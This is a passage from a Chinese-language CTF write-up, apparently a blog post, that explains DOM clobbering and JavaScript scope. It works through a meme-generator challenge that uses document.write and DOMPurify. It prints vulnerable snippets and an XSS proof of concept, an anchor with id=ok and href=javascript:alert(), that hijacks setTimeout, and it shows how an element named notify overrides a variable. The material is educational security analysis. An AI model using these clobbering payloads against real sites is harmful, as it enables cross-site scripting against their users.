src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201223309.png" alt=""></p><p>根据 MDN 文档</p><blockquote><p>​    The <strong><code>domain</code></strong> property of the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Document" target="_blank" rel="noopener"><code>Document</code></a> interface gets/sets the domain portion of the origin of the current document, as used by the <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy" target="_blank" rel="noopener">same origin policy</a>.</p></blockquote><p>这里的<code>document.domain</code>并没有获取到我的域名<code>zedd.vv</code>，反而是获取到了 img 标签，然后我们可以直接输出 document 对象来看看是怎么回事</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201224629.png" alt=""></p><p>通过这个例子我们可以知道，可以通过一些标签的 id(name) 属性来控制 document(window) 通过 DOM API(BOM API) 获取到的某个东西</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201224817.png" alt=""></p><p>我查阅过相关资料，也询问过一些前端的专业人员，这里给我的解释是”document 和 window 两个变量，其实是 DOM 和 BOM 的规范，一般来说这两个不应该被当做普通的 JS 对象，但是规范与实现不同”，”都是因为上古遗留问题，现在哪有直接写 document.xxx 来获取元素的，TS 和 eslint 都会报错”。</p><p>这种操作具体可以参考 <a href="http://www.thespanner.co.uk/2013/05/16/dom-clobbering/" target="_blank" rel="noopener">dom-clobbering</a>，不算是新的攻击手法，但是有效，我们可以通过利用这种 Trick 来实现一些操作。</p><h3 id="setTimeout"><a href="#setTimeout" class="headerlink" title="setTimeout"></a>setTimeout</h3><p>我们了解了 Dom Clobbering 之后，我们可以先看看可以怎么通过<code>setTimeout</code>来利用</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"a"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">    a.innerHTML = <span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">'b'</span>);</span></span><br><span class="line">    setTimeout(ok, 2000)</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>简化了一下题目代码，对于以上的代码，我们可以通过利用 Dom Clobbering 来实现 XSS ，因为我们可以直接传入 id 为 ok 的标签进行 XSS ，例如传入</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">ok</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>可是为什么呢？</p><p>根据 MDN 文档，<code>setTimeout</code>的第一个参数，必须是个函数或字符串。可是根据 Dom Clobbering ，这里的<code>ok</code>应该是一个 a 标签，既然这不是个函数，它就尝试用<code>toString</code>方法转换成字符串，而根据 MDN 文档 <a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLAnchorElement" target="_blank" rel="noopener">HTMLAnchorElement</a></p><blockquote><p>​    <a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLHyperlinkElementUtils/toString" target="_blank" rel="noopener"><code>HTMLHyperlinkElementUtils.toString()</code></a></p><p>Returns a <a href="https://developer.mozilla.org/en-US/docs/Web/API/USVString" target="_blank" rel="noopener"><code>USVString</code></a> containing the whole URL. It is a synonym for <a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLHyperlinkElementUtils/href" target="_blank" rel="noopener"><code>HTMLHyperlinkElementUtils.href</code></a>, though it can’t be used to modify the value.</p></blockquote><p>而当 a 标签通过<code>toString()</code>方法转换我们可以得到它的 href 属性，也就是<code>javascript:alert()</code>，所以我们就可以执行代码了。</p><h3 id="notify"><a href="#notify" class="headerlink" title="notify"></a>notify</h3><p>好了，回到我们的 notify 上，虽然我们可以通过 DOM Clobbering 进行“污染”一些参数，但是题目直接规定了<code>let notify = false</code>，浏览器当然也不可能允许我们修改服务端的代码，这可怎么办？</p><p>其实这里的 notify 比较具有误导性，比较像 C 语言入门的时候函数传参部分，我们把整个代码改一下：</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript"><span class="hljs-keyword">const</span> memeGen = <span class="hljs-function">(<span class="hljs-params">that, notify</span>) =&gt;</span> {</span></span><br><span class="line">truetruetruetrueif (text &amp;&amp; img) {</span><br><span class="line">truetruetruetruetruetemplate = memeTemplate(img, text);</span><br><span class="line">truetruetruetruetrueif (notify) {</span><br><span class="line"><span class="hljs-actionscript"><span class="hljs-comment">//...</span></span></span><br><span class="line">truetruetruetruetrue}</span><br><span class="line">truetruetruetrue}</span><br><span class="line">truetruetrue};</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">  <span class="hljs-comment">/* Main */</span></span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">let</span> notify = <span class="hljs-literal">false</span>;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">let</span> text = <span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">"text"</span>);</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">let</span> img = <span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">"img"</span>);</span></span><br><span class="line">  if (text &amp;&amp; img) {</span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-built_in">document</span>.write(</span></span><br><span class="line"><span class="hljs-handlebars"><span class="hljs-xml">      `<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"alert alert-primary"</span> <span class="hljs-attr">role</span>=<span class="hljs-string">"alert"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"status"</span>&gt;</span>` +</span></span></span><br><span class="line"><span class="hljs-actionscript">      `&lt;img <span class="hljs-class"><span class="hljs-keyword">class</span>="<span class="hljs-title">circle</span>" <span class="hljs-title">src</span>="$</span>{escape(</span></span><br><span class="line">        img</span><br><span class="line"><span class="hljs-actionscript">      )}<span class="hljs-string">" onload="</span>memeGen(<span class="hljs-keyword">this</span>, notify)<span class="hljs-string">"&gt;` +</span></span></span><br><span class="line"><span class="hljs-javascript">      <span class="hljs-string">`Creating meme... (<span class="hljs-subst">${DOMPurify.sanitize(text)}</span>)&lt;/div&gt;`</span></span></span><br><span class="line">    );</span><br><span class="line"><span class="hljs-actionscript">  } <span class="hljs-keyword">else</span> {</span></span><br><span class="line"><span class="hljs-javascript">    $(<span class="hljs-string">"#meme-code"</span>).text(</span></span><br><span class="line">      memeTemplate(</span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-string">"https://i.imgur.com/PdbDexI.jpg"</span>,</span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-string">"When you get that WW3 draft letter"</span></span></span><br><span class="line">      )</span><br><span class="line">    );</span><br><span class="line">  }</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>再简化一下就成了我们的 C 语言函数传参的练习题了</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">const</span> memeGen = <span class="hljs-function">(<span class="hljs-params">that, x</span>) =&gt;</span> {</span><br><span class="line">  <span class="hljs-keyword">if</span> (x) {</span><br><span class="line">    <span class="hljs-comment">//...</span></span><br><span class="line">  }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p></p><p>为了易于理解我们可以写成这样就不易弄混了，所以，对于<code>memeGen</code>来说，<code>notify</code>只是一个参数变量名，区别于我们一开始提到的 Javascript Scope 部分，该函数内的<code>notify</code>参数变量取决于该函数所在的作用域。</p><p>而对于<code>memeGen</code>函数来说，它的作用域并非是在<code>let notify = false</code>所处的 JS 代码域当中，而是在通过<code>document.write</code>函数之后的作用域，所以这里就涉及到了作用域的问题。</p><h3 id="JavaScript-Scope"><a href="#JavaScript-Scope" class="headerlink" title="JavaScript Scope"></a>JavaScript Scope</h3><p>所以对于执行<code>document.write</code>函数过后，也就是对于<code>onload=memeGen</code>函数来说，其作用域并非是 JS 的作用域，在题目中本来这么几个作用域：window、script、onload，其中 window 包含了后两个，后两个互不包含，所以这里在 onload 找不到 notify 变量，就会去 window 的作用域找，就会把 script 作用域当中的 notify 给找到，notify 变量也就成 false 了。</p><p>我们也可以通过一个简单的例子来理解：</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">name</span>=<span class="hljs-string">x</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">const</span> test = <span class="hljs-function">(<span class="hljs-params">that,x</span>) =&gt;</span> {</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"Test'x: "</span> + x);</span></span><br><span class="line">    if(x){</span><br><span class="line"><span class="hljs-javascript">      <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"JS Magic"</span>);</span></span><br><span class="line">    }</span><br><span class="line">  };</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">let</span> x = <span class="hljs-literal">false</span>;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"JS'x: "</span> + x);</span></span><br><span class="line"><span class="hljs-handlebars"><span class="hljs-xml">  document.write("<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">test(this,x)</span>&gt;</span>");</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200202004222.png" alt=""></p><p>原理都是一样的，这里<code>test</code>函数在<code>onerror</code>作用域找到了 x 变量，所以就不会再去找 window 作用域下的 <code>x=false</code>变量了，所以本题我们需要引入一个<code>name=notify</code>的标签来“覆盖”掉原来的 notify 变量。</p><p>其实这也是一开始我们可以发现题目给出的代码有一处也比较神奇就是 text &amp; img</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">const</span> memeGen = <span class="hljs-function">(<span class="hljs-params">that, notify</span>) =&gt;</span> {</span><br><span class="line">  <span class="hljs-keyword">if</span> (text &amp;&amp; img) {</span><br><span class="line">    template = memeTemplate(img, text);</span><br><span class="line">    ...</span><br><span class="line">  }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p></p><p><code>memeGen</code>函数在函数内找不到<code>text</code>，onload 的作用域也找不到<code>text</code>，就会去 script下面找，而多个 script 属于同一个作用域，所以对于函数当中的 text 以及 img ，它是在下一块 JS 代码段定义的。</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span 